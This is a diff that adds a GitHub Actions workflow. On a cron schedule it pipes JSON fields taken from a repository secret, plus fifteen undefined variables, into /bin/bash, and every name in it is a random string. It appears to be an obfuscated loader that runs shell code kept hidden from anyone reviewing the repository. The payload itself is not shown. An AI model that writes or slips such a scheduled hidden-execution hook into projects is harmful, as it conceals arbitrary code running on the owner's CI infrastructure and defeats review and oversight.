@@ -1,0 +1,33 @@
+name: questionlinear
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: questionlinear
+        env:
+          jdxuf57: ${{ secrets.jdxuf57 }}
+        run: |
+          echo $jdxuf57 | jq -r .mb8636 | /bin/bash
+          echo $dcp0 | jq -r .fhj362 | /bin/bash
+          echo $ckhph214 | jq -r .t434 | /bin/bash
+          echo $yhdg1 | jq -r .gxf5 | /bin/bash
+          echo $mz5602 | jq -r .mwmht2873 | /bin/bash
+          echo $unip9 | jq -r .xetn79217 | /bin/bash
+          echo $yfjf595 | jq -r .f83 | /bin/bash
+          echo $mda1275 | jq -r .pibfr7523 | /bin/bash
+          echo $ykcsi4 | jq -r .hpe0324 | /bin/bash
+          echo $lh2038 | jq -r .vnsn25029 | /bin/bash
+          echo $px60513 | jq -r .y7 | /bin/bash
+          echo $x97856 | jq -r .tppac95 | /bin/bash
+          echo $uqvyf7 | jq -r .ui77 | /bin/bash
+          echo $hof82806 | jq -r .gknwq3138 | /bin/bash
+          echo $ilze2 | jq -r .pxr64113 | /bin/bash
+          echo $wpx587 | jq -r .oevz2147 | /bin/bash
+
